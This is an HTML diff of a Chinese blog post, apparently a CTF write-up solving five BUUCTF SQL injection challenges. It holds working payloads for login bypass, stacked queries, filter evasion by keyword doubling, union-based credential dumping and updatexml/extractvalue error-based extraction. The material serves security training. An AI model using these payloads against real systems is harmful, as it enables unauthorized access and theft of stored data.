@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cgw-f.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQL注入|BUUCTF SQL注入题解[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1) [[SUCTF 2019]EasySQL](#[SUCTF 2019]EasySQL) [[极客大挑战 2019]BabySQL](#[极客大挑战 2019]BabySQL) [[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战2019-SQl注入">
+<meta property="og:url" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="北极星上的稻草人">
+<meta property="og:description" content="SQL注入|BUUCTF SQL注入题解[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1) [[SUCTF 2019]EasySQL](#[SUCTF 2019]EasySQL) [[极客大挑战 2019]BabySQL](#[极客大挑战 2019]BabySQL) [[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164625418.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164705027.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image005.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image006.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image007.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164737704.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image011.jpg">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164805520.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165007891.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165025565.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165038935.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165053106.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165113765.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165129244.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165146057.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165201636.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165215075.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165231604.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165245349.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165259421.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165315390.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165332517.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165345912.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165400764.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165422902.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165437962.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165453466.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165508705.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165521812.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165536158.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165547343.png">
+<meta property="article:published_time" content="2023-11-13T08:44:53.000Z">
+<meta property="article:modified_time" content="2023-11-13T09:00:23.493Z">
+<meta property="article:author" content="北极星上的稻草人">
+<meta property="article:tag" content="靶场训练">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164625418.png">
+
+<link rel="canonical" href="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>极客大挑战2019-SQl注入 | 北极星上的稻草人</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">北极星上的稻草人</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">稻草人笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          极客大挑战2019-SQl注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-13 16:44:53 / 修改时间：17:00:23" itemprop="dateCreated datePublished" datetime="2023-11-13T16:44:53+08:00">2023-11-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SQL注入-BUUCTF-SQL注入题解"><a href="#SQL注入-BUUCTF-SQL注入题解" class="headerlink" title="SQL注入|BUUCTF SQL注入题解"></a>SQL注入|BUUCTF SQL注入题解</h1><p>[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1)</p>
+<p>[[SUCTF 2019]EasySQL](#[SUCTF 2019]EasySQL)</p>
+<p>[[极客大挑战 2019]BabySQL](#[极客大挑战 2019]BabySQL)</p>
+<p>[[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL)</p>
+<p>[[极客大挑战 2019]HardSQL](#[极客大挑战 2019]HardSQL)</p>
+<h2 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h2><p>【难度】：几乎没有任何防御手段</p>
+<p>登录界面，弱口令、万能密码走一波</p>
+<p>l  弱口令</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164625418.png" alt="image-20231113164625418"></p>
+<p>l  万能密码</p>
+<p>万能密码：’or 1=1–+’</p>
+<p>说明：“–”是注释符，利用“–”闭合的时候，其后要跟“空格”，“+”就是url编码后的空格 符</p>
+<p>?username=’or 1=1–+’&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164705027.png" alt="image-20231113164705027"></p>
+<p>成功拿到flag</p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>l  正常输入，看回显</p>
+<p>输入1</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image005.png" alt="img"></p>
+<p>一开始以为输入数字x，就输出Array（[0]=&gt;x），尝试其他数字输入后，发现这是一个逻辑判断。输入&gt;0的输入，输出均为Array（[0]=&gt;1）；输入0时，没有输出。猜测内设的sql语句是布尔逻辑语句</p>
+<p>l  输入万能密码’or 1=1’</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image006.png" alt="img"></p>
+<p>尝试普通的sql注入，返回均为Nonono</p>
+<p><strong>解法：堆叠注入</strong></p>
+<p>l  查数据库</p>
+<p><strong>payload</strong>：database()#  或者 1,database()# 或者1; database()#等都可</p>
+<p>“#”可以用“;”替换。</p>
+<p>l  payload：1,database()#的结果</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image007.png" alt="img"></p>
+<p>l  payload :1; database()；的结果</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164737704.png" alt="image-20231113164737704"></p>
+<p><strong>获得数据库名：ctf</strong></p>
+<p>l  查表明</p>
+<p>l  Payload：1;show table;</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image011.jpg" alt="img"></p>
+<p><strong>获得表名：Flag</strong></p>
+<p><strong>！！！到这里，，猜测该系统后台内置的sql语句为：</strong></p>
+<p>select $_POST[‘query’] || flag from flag [1] </p>
+<p>或者sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
+<p>l  <strong>题解payload1：*.1</strong></p>
+<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164805520.png" alt="image-20231113164805520"></p>
+<p>l  <strong>题解payload2：1;set sql_mode=pipes_as_concat;select 1</strong></p>
+<p><strong>set sql_mode=pipes_as_concat：</strong>把“||” 设置为“or”，但mysql8.0版本后取消了</p>
+<p>sql语句就变成了select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag，也就是select 1 or select 1 from Flag</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165007891.png" alt="image-20231113165007891"></p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>l  万能密码走一波</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165025565.png" alt="image-20231113165025565"></p>
+<p>发现关键字“or”被过滤了，注意“+”被编码为空格了，并没有被过滤；尝试其他的关键后，发现大部分关键字都被过滤了。</p>
+<p><strong>【绕过方法】重写绕过</strong></p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165038935.png" alt="image-20231113165038935"></p>
+<p>l  <strong>获取数据库</strong></p>
+<p>Payload：1’ ununionion seselectlect 1,database(),2–+&amp;password=123456</p>
+<p>获取到数据名：geek</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165053106.png" alt="image-20231113165053106"></p>
+<p>l  <strong>获取表名</strong></p>
+<p>Payload：?username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()–+&amp;password=123456</p>
+<p>注意要替换所有关键字，例如information也存在from，需要重写并替换为infoorrmation。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165113765.png" alt="image-20231113165113765"></p>
+<p>l  <strong>获取字段名</strong></p>
+<p><strong>查看全部表的列名Payload</strong>：?username=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database()–+&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165129244.png" alt="image-20231113165129244"></p>
+<p><strong>查看单个表的列名payload</strong>：?username=1’ uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=”b4bsql”–+&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165146057.png" alt="image-20231113165146057"></p>
+<p>l  <strong>查看字段</strong></p>
+<p>?username=1’ ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql–+&amp;password=123456–+</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165201636.png" alt="image-20231113165201636"></p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>² <strong>万能密码走一波</strong></p>
+<p>Payload：?username=’ or 1=1–+’&amp;password=’ or 1=1’</p>
+<p>注意：“–+”注释符不要漏</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165215075.png" alt="image-20231113165215075"></p>
+<p>拿到账号密码（加密），且知道存在sql注入漏洞</p>
+<p>² <strong>判断注入点数与位置</strong></p>
+<p>Payload：?username=1’ union select 1,2,3–+’&amp;password=’ or 1=1’</p>
+<p>这里的“1”可有可无，“‘ ’ ”构成闭合即可</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165231604.png" alt="image-20231113165231604"></p>
+<p>² <strong>获取数据库</strong></p>
+<p>Payload：?username=1’union select 1,2,database()–+’&amp;password=’ or 1=1’</p>
+<p>数据库：geek</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165245349.png" alt="image-20231113165245349"></p>
+<p>² <strong>获取表名</strong></p>
+<p>Payload：?username=1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+’&amp;password=’ or 1=1’</p>
+<p>表名：geekuser、l0ve1ysq1</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165259421.png" alt="image-20231113165259421"></p>
+<p>² <strong>获取字段名</strong></p>
+<p>获取l0ve1ysq1表的字段名payload：?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name= ‘<strong>l0ve1ysq1</strong>‘–+’&amp;password=’ or 1=1’</p>
+<p>字段名：id、username、password</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165315390.png" alt="image-20231113165315390"></p>
+<p>² <strong>获取数据</strong></p>
+<p>Payload: ?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1–+’&amp;password=’ or 1=1’</p>
+<p>这里的flag只截取了部分，剩下部分在左边，滑动可以找到</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165332517.png" alt="image-20231113165332517"></p>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>经过测试，发现站点禁用了空格、#、大部分常用的关键字等等。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165345912.png" alt="image-20231113165345912"></p>
+<p>存在报错回显</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165400764.png" alt="image-20231113165400764"></p>
+<p>禁用了大部分关键字且没有回显位置；只有报错回显，所以尝试“报错注入”。</p>
+<p><strong>思路</strong>：对于空格和#等字符，可以采取替换的绕过方式，例如：</p>
+<p>空格替换：括号（）、</p>
+<p>#：编码</p>
+<p>or：异或符号^</p>
+<p>l  <strong>报错注入</strong></p>
+<p>常用函数</p>
+<p>² <strong>Updatexml()</strong></p>
+<p><strong>用法</strong>：updatexml(XML_document, XPath_string, new_value）</p>
+<p>-   XML_document是string格式，为XML文档对象的名称，列入Doc</p>
+<p>-   XPath_string是路径，XPath格式的字符串。</p>
+<p>-   new_value,string格式，替换查找到的符合条件的数据</p>
+<p><strong>报错技巧</strong>：由于XPath_string文件路径基本都是以“/”开头，所以用其他字符开头就可能会报错，例如“~”、</p>
+<p>² <strong>Extractvalue()</strong></p>
+<p><strong>用法</strong>：extractvalue(XML_document,XPath_string)</p>
+<p>-   XML_document指xml文档对象（文件名）</p>
+<p>-   XPath_string指文件路径</p>
+<p><strong>报错技巧</strong>：由于XPath_string文件路径基本都是以“/”开头，所以用其他字符开头就可能会报错，例如“~”、</p>
+<p>l  <strong>题解</strong></p>
+<p>² <strong>获取数据库</strong></p>
+<p><strong>Updatexml报错payload：</strong></p>
+<p>?username=1’^updatexml(1,concat(0x7e,(select(database()))),3)%23&amp;password=123456</p>
+<p>或?username=1’^updatexml(1,concat(‘~’,(select(database()))),3)%23&amp;password=123456</p>
+<p>-   0x7e：16进制数，ASCII码对应的字符是“<del>”；为了隐蔽，常用编码值0X7e而不是“</del>”。</p>
+<p>-   %23：url编码，对应的字符是“#”；这里不能直接用–+，因为没有引号构造闭合。</p>
+<p>-   1后面的“ ’ ’”不能漏，要构造闭合</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165422902.png" alt="image-20231113165422902"></p>
+<p><strong>Extractvalue报错payload：</strong></p>
+<p>?username=1’^extractvalue(1,concat(0x5c,(select(database()))))%23</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165437962.png" alt="image-20231113165437962"></p>
+<p>数据库：geek</p>
+<p>² <strong>获取表名</strong></p>
+<p>Payload：1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165453466.png" alt="image-20231113165453466"></p>
+<p>表名：H4rDsq1</p>
+<p>² <strong>获取字段名</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23&amp;password=123456</p>
+<p>注意：and也被ban了的</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165508705.png" alt="image-20231113165508705"></p>
+<p>字段名：id、username、password</p>
+<p>² <strong>获取数据</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165521812.png" alt="image-20231113165521812"></p>
+<p>发现只有半截flag，原因是回显的消息有长度限制。可以采取分块截取的方式获取完整的flag。注意，需要自己查找flag在那个字段下。</p>
+<p><strong>获取前（左）30个字符</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23&amp;password=123456</p>
